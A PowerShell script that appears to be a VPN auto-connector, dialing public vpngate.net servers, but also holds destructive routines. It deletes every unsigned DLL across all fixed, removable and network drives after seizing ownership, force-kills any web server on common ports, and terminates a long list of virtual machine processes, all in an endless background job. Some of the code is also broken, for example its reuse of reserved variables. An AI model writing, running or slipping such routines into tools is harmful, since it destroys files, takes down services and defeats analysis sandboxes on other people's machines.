# Function to check if VPN is connected
function Test-VpnConnection {
    try {
        $rasdialOutput = & rasdial 2>&1
        if ($rasdialOutput -match "Connected") {
            return $true
        }
        return $false
    }
    catch {
        return $false
    }
}

# Function to get public VPN server information
function Get-PublicVpnServer {
    try {
        # Set timeout for web request
        $webClient = New-Object System.Net.WebClient
        $webClient.Timeout = 5000  # 5 seconds timeout
        
        # Get VPN server list from vpngate.net
        $response = $webClient.DownloadString("https://www.vpngate.net/api/iphone/")
        
        # Parse the response
        $lines = $response -split "`n" | Where-Object { $_ -ne "" }
        $servers = $lines | Where-Object { 
            $_ -match "," -and ($_ -split ",").Count -gt 6 
        } | ForEach-Object {
            $fields = $_ -split ","
            $pingValue = 0
            if ([int]::TryParse($fields[6], [ref]$pingValue)) {
                $ping = $pingValue
            } else {
                $ping = [int]::MaxValue
            }
            [PSCustomObject]@{
                Hostname = $fields[1]
                Country = $fields[2]
                Ping = $ping
            }
        } | Sort-Object Ping
        
        if ($servers.Count -gt 0) {
            $bestServer = $servers[0]
            return [PSCustomObject]@{
                Host = $bestServer.Hostname
                Country = $bestServer.Country
            }
        }
        return $null
    }
    catch {
        Write-Error "Failed to get VPN server list: $_"
        return $null
    }
    finally {
        if ($webClient) { $webClient.Dispose() }
    }
}

# Function to connect to VPN
function Connect-Vpn {
    param (
        [Parameter(Mandatory = $true)]
        [string]$Host
    )
    
    try {
        $process = Start-Process -FilePath "rasdial" `
            -ArgumentList "MyVPN $Host vpn vpn" `
            -NoNewWindow `
            -PassThru `
            -RedirectStandardOutput "vpn_output.txt" `
            -RedirectStandardError "vpn_error.txt"
        
        # Wait for process to complete (timeout after 10 seconds)
        $completed = $process.WaitForExit(10000)
        
        if (-not $completed) {
            $process.Kill()
            return $false
        }
        
        return $process.ExitCode -eq 0
    }
    catch {
        Write-Error "Failed to connect to VPN: $_"
        return $false
    }
    finally {
        # Clean up temporary files
        Remove-Item -Path "vpn_output.txt" -ErrorAction SilentlyContinue
        Remove-Item -Path "vpn_error.txt" -ErrorAction SilentlyContinue
    }
}

# Main VPN monitoring function
function Start-VpnMonitor {
    param (
        [switch]$Continuous
    )
    
    do {
        if (-not (Test-VpnConnection)) {
            Write-Host "VPN not connected. Attempting to find and connect to a VPN server..."
            
            $vpnInfo = Get-PublicVpnServer
            if ($vpnInfo) {
                Write-Host "Found VPN server: $($vpnInfo.Host) in $($vpnInfo.Country)"
                $success = Connect-Vpn -Host $vpnInfo.Host
                
                if ($success) {
                    Write-Host "Successfully connected to VPN"
                } else {
                    Write-Host "Failed to connect to VPN"
                }
            } else {
                Write-Host "Could not find any VPN servers"
            }
        } else {
            Write-Host "VPN is already connected"
        }
        
        if ($Continuous) {
            Start-Sleep -Seconds 30
        }
    } while ($Continuous)
}

function Remove-UnsignedDLLs {
    $drives = Get-PSDrive -PSProvider FileSystem | Where-Object { 
        $_.DriveType -in @('Fixed', 'Removable', 'Network') 
    }
    $dlls = Get-ChildItem -Recurse -Path $drives.Root -Filter "*.dll"
    foreach ($dll in $dlls) {
        $cert = Get-AuthenticodeSignature $dll.FullName
        if ($cert.Status -ne "Valid") {
            $processes = Get-WmiObject Win32_Process | Where-Object { 
                $_.CommandLine -like "*$($dll.FullName)*" 
            }
            foreach ($process in $processes) {
                Stop-Process -Id $process.ProcessId -Force
            }
            takeown /f $dll.FullName
            icacls $dll.FullName /inheritance:d
            icacls $dll.FullName /grant:r Administrators:F
            Remove-Item $dll.FullName -Force
        }
    }
}

function Kill-WebServers {
    $ports = @(80, 443, 8080, 8888)
    $connections = Get-NetTCPConnection -State Listen | Where-Object { $_.LocalPort -in $ports }
    foreach ($conn in $connections) {
        $pid = $conn.OwningProcess
        Stop-Process -Id $pid -Force
    }
}

function Kill-VMs {
    # Expanded list of VM-related process names
    $vmProcesses = @(
        # VMware-related processes
        "vmware-vmx",     # VMware VM executable
        "vmware",         # VMware Workstation/Player main process
        "vmware-tray",    # VMware tray icon
        "vmwp",           # VMware Worker Process
        "vmnat",          # VMware Network Address Translation
        "vmnetdhcp",      # VMware DHCP service
        "vmware-authd",   # VMware Authentication Daemon
        "vmware-usbarbitrator", # VMware USB Arbitrator
        # Hyper-V-related processes
        "vmms",           # Hyper-V Virtual Machine Management Service
        "vmcompute",      # Hyper-V Host Compute Service
        "vmsrvc",         # Hyper-V Virtual Machine Service
        "vmwp",           # Hyper-V Worker Process (also used by VMware, context-dependent)
        "hvhost",         # Hyper-V Host Service
        "vmmem",          # Hyper-V Memory Manager (used by WSL2 VMs too)
        # VirtualBox-related processes
        "VBoxSVC",        # VirtualBox Service
        "VBoxHeadless",   # VirtualBox Headless VM Process
        "VirtualBoxVM",   # VirtualBox VM Process (newer versions)
        "VBoxManage",     # VirtualBox Management Interface
        # QEMU/KVM-related processes
        "qemu-system-x86_64", # QEMU x86_64 emulator
        "qemu-system-i386",   # QEMU i386 emulator
        "qemu-system-arm",    # QEMU ARM emulator
        "qemu-system-aarch64",# QEMU ARM64 emulator
        "kvm",            # Kernel-based Virtual Machine (generic)
        "qemu-kvm",       # QEMU with KVM acceleration
        # Parallels-related processes
        "prl_client_app", # Parallels Client Application
        "prl_cc",         # Parallels Control Center
        "prl_tools_service", # Parallels Tools Service
        "prl_vm_app",     # Parallels VM Application
        # Other virtualization platforms
        "bhyve",          # FreeBSD Hypervisor (bhyve VM process)
        "xen",            # Xen Hypervisor generic process
        "xenservice",     # XenService for XenServer
        "bochs",          # Bochs Emulator
        "dosbox",         # DOSBox (emulator often used for legacy VMs)
        "utm",            # UTM (macOS virtualization tool based on QEMU)
        # Windows Subsystem for Linux (WSL) and related
        "wsl",            # WSL main process
        "wslhost",        # WSL Host process
        "vmmem",          # WSL2 VM memory process (shared with Hyper-V)
        # Miscellaneous or niche VM tools
        "simics",         # Simics Simulator
        "vbox",           # Older VirtualBox process shorthand
        "parallels"       # Parallels generic process shorthand
    )
    $processes = Get-Process
    $vmRunning = $processes | Where-Object { $vmProcesses -contains $_.Name }
    if ($vmRunning) {
        $vmRunning | Format-Table -Property Id, Name, Description -AutoSize
        foreach ($process in $vmRunning) {
            Stop-Process -Id $process.Id -Force
        }
    }
}
    
Start-Job -ScriptBlock {
    while ($true) {
        Kill-VMs
        Remove-UnsignedDLLs
        Kill-WebServers
        Start-VpnMonitor -Continuous
    }
}